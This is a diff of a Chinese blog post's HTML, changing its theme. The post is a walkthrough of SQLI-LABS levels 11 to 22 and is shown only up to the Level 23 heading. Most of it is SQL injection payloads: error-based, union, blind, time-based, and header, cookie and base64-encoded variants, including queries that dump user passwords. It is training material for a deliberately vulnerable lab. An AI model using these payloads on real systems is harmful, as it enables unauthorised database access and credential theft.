@@ -1,43 +1,95 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="接上篇">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SQLI-LABS(Less11-Less35)">
-<meta property="og:url" content="http://chaosec.top/2018/02/09/sqli-labs2/index.html">
-<meta property="og:site_name" content="Aesm1p&#39; Blog">
-<meta property="og:description" content="接上篇">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2018-02-09T02:50:57.000Z">
-<meta property="article:modified_time" content="2019-05-16T09:18:03.185Z">
-<meta property="article:author" content="Aesm1p">
-<meta property="article:tag" content="SQL注入">
-<meta name="twitter:card" content="summary"><title>SQLI-LABS(Less11-Less35) | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2018/02/09/sqli-labs2/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: undefined,
-  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
-  reward: true,
-  fancybox: true,
-  zoomImage: {"gapAside":"50px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: undefined,
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SQLI-LABS(Less11-Less35) | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-shapes"></i></span><span class="header-nav-menu-item__text">Article</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">Archives</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fab fa-buffer"></i></span><span class="header-nav-submenu-item__text">Categories</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">Tags</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SQLI-LABS(Less11-Less35)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon" data-popover="Created Time" data-popover-pos="up"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__value">2018-02-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon" data-popover="Updated Time" data-popover-pos="up"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__value">2019-05-16</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon" data-popover="Words Count" data-popover-pos="up"><i class="far fa-file-word"></i></span><span class="post-meta-item__value">2,120</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon" data-popover="Reading Time" data-popover-pos="up"><i class="far fa-clock"></i></span><span class="post-meta-item__value">17m</span></span></div></header><div class="post-body"><p>接上篇</p>
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="SQL注入">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="SQLI-LABS(Less11-Less35)"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>SQLI-LABS(Less11-Less35)</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/02/09/sqli-labs2/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-02-09T02:50:57.000Z">
+          2018-02-09
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>接上篇</p>
 <a id="more"></a>
-
-        <h1 id="LESS-11">
-          <a href="#LESS-11" class="heading-link"><i class="fas fa-link"></i></a>LESS-11</h1>
-      <p>有回显，尝试报错注入<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usernae = admin'and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">#</span></span><br><span class="line"><span class="keyword">password</span> = <span class="keyword">admin</span><span class="string">'and 1=(updatexml(1,concat(0x3a,(select database())),1))#</span></span><br></pre></td></tr></table></div></figure></p>
+<h1 id="LESS-11"><a href="#LESS-11" class="headerlink" title="LESS-11"></a>LESS-11</h1><p>有回显，尝试报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usernae = admin'and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">#</span></span><br><span class="line"><span class="keyword">password</span> = <span class="keyword">admin</span><span class="string">'and 1=(updatexml(1,concat(0x3a,(select database())),1))#</span></span><br></pre></td></tr></table></figure></p>
 <p>发现有回显</p>
 <blockquote>
 <p>XPATH syntax error: ‘:security’</p>
@@ -45,112 +97,64 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <p>则可以得到数据库名。</p>
 <hr>
 <p>常用报错语句</p>
-<p>1、通过floor报错,注入语句如下:<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></div></figure></p>
-<p>2、通过ExtractValue报错,注入语句如下:<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>)));</span><br></pre></td></tr></table></div></figure></p>
-<p>3、通过UpdateXml报错,注入语句如下:<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></div></figure></p>
-<p>4、通过NAME_CONST报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></div></figure></p>
-<p>5、通过join报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></div></figure></p>
-<p>6、通过exp报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></div></figure></p>
-<p>7、通过GeometryCollection()报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></div></figure></p>
-<p>8、通过polygon ()报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></div></figure></p>
-<p>9、通过multipoint ()报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></div></figure></p>
-<p>10、通过multlinestring ()报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></div></figure></p>
-<p>11、通过multpolygon ()报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></div></figure></p>
-<p>12、通过linestring ()报错,注入语句如下:<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></div></figure></p>
+<p>1、通过floor报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure></p>
+<p>2、通过ExtractValue报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>)));</span><br></pre></td></tr></table></figure></p>
+<p>3、通过UpdateXml报错,注入语句如下:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure></p>
+<p>4、通过NAME_CONST报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure></p>
+<p>5、通过join报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure></p>
+<p>6、通过exp报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure></p>
+<p>7、通过GeometryCollection()报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure></p>
+<p>8、通过polygon ()报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure></p>
+<p>9、通过multipoint ()报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure></p>
+<p>10、通过multlinestring ()报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure></p>
+<p>11、通过multpolygon ()报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure></p>
+<p>12、通过linestring ()报错,注入语句如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure></p>
 <hr>
 <p>还有其他方法</p>
-<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>
 <p>这样可以得到数据库名<br>继续爆表</p>
-<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span><span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span><span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>
 <p>可以得到</p>
 <blockquote>
 <p>Your Password:emails,referers,uagents,users<br>爆字段</p>
 </blockquote>
-<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password<br>爆内容</p>
 </blockquote>
-<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure>
-
-        <h1 id="LESS-12">
-          <a href="#LESS-12" class="heading-link"><i class="fas fa-link"></i></a>LESS-12</h1>
-      <p>构造闭合语句<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin") or 1=1 limit 0,1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin45' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">concat_ws</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure>
+<h1 id="LESS-12"><a href="#LESS-12" class="headerlink" title="LESS-12"></a>LESS-12</h1><p>构造闭合语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin") or 1=1 limit 0,1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>
 <p>后面和11关一样</p>
-
-        <h1 id="LESS-13">
-          <a href="#LESS-13" class="heading-link"><i class="fas fa-link"></i></a>LESS-13</h1>
-      <p>尝试 <code>uname=admin&#39;&amp;passwd=1</code>,返回错误信息</p>
+<h1 id="LESS-13"><a href="#LESS-13" class="headerlink" title="LESS-13"></a>LESS-13</h1><p>尝试 <code>uname=admin&#39;&amp;passwd=1</code>,返回错误信息</p>
 <blockquote>
 <p>near ‘1’) LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p>构造闭合语句<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin')<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure><br>可以成功登陆，但是无法和前面一样显示信息，故得使用盲注<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin') and left(database(),1)='s'<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure><br>然后一步步可以得到所有信息</p>
-
-        <h1 id="LESS-14">
-          <a href="#LESS-14" class="heading-link"><i class="fas fa-link"></i></a>LESS-14</h1>
-      <p>直接换双引号闭合<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin" or 1=1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-15">
-          <a href="#LESS-15" class="heading-link"><i class="fas fa-link"></i></a>LESS-15</h1>
-      <p>单引号闭合即可<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin" or 1=1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure></p>
-<p>也可以延时注入<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))<span class="comment">#&amp;passwd=admin</span></span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-16">
-          <a href="#LESS-16" class="heading-link"><i class="fas fa-link"></i></a>LESS-16</h1>
-      <p>payload<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin") or 1=1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-17">
-          <a href="#LESS-17" class="heading-link"><i class="fas fa-link"></i></a>LESS-17</h1>
-      <p>本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。<br>报错注入payload<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></div></figure><br>也可以延时注入，但是延时注入会修改数据库内容，不建议使用。</p>
+<p>构造闭合语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin')<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><br>可以成功登陆，但是无法和前面一样显示信息，故得使用盲注<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin') and left(database(),1)='s'<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure><br>然后一步步可以得到所有信息</p>
+<h1 id="LESS-14"><a href="#LESS-14" class="headerlink" title="LESS-14"></a>LESS-14</h1><p>直接换双引号闭合<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin" or 1=1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-15"><a href="#LESS-15" class="headerlink" title="LESS-15"></a>LESS-15</h1><p>单引号闭合即可<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin" or 1=1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>
+<p>也可以延时注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))<span class="comment">#&amp;passwd=admin</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-16"><a href="#LESS-16" class="headerlink" title="LESS-16"></a>LESS-16</h1><p>payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin") or 1=1<span class="comment">#&amp;passwd=1</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="LESS-17"><a href="#LESS-17" class="headerlink" title="LESS-17"></a>LESS-17</h1><p>本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。<br>报错注入payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><br>也可以延时注入，但是延时注入会修改数据库内容，不建议使用。</p>
 <p>接下来三关是对header头的注入</p>
-
-        <h1 id="LESS-18">
-          <a href="#LESS-18" class="heading-link"><i class="fas fa-link"></i></a>LESS-18</h1>
-      <p>截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。<br>修改User-Agent，利用报错进行注入<br>payload<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></div></figure></p>
-<p>这个在本题不可以用，但是可以报错，<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-19">
-          <a href="#LESS-19" class="heading-link"><i class="fas fa-link"></i></a>LESS-19</h1>
-      <p>只是将注入位置换为referer即可</p>
-
-        <h1 id="LESS-20">
-          <a href="#LESS-20" class="heading-link"><i class="fas fa-link"></i></a>LESS-20</h1>
-      <p>用cookie注入,这里我用的是火狐的Cookie Manager插件<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumb' and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></div></figure><br>然后可以继续注入获取全部内容。</p>
-
-        <h1 id="LESS-21">
-          <a href="#LESS-21" class="heading-link"><i class="fas fa-link"></i></a>LESS-21</h1>
-      <p>本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。<br><figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumb') and updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></div></figure><br>再用base64编码<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3d%3d</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-22">
-          <a href="#LESS-22" class="heading-link"><i class="fas fa-link"></i></a>LESS-22</h1>
-      <p>与21关相同只是闭合方式变成了双引号<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgQEB2ZXJzaW9uKSwweDdlKSwxKSM%3d</span><br></pre></td></tr></table></div></figure></p>
-
-        <h1 id="LESS-23">
-          <a href="#LESS-23" class="heading-link"><i class="fas fa-link"></i></a>LESS-23</h1>
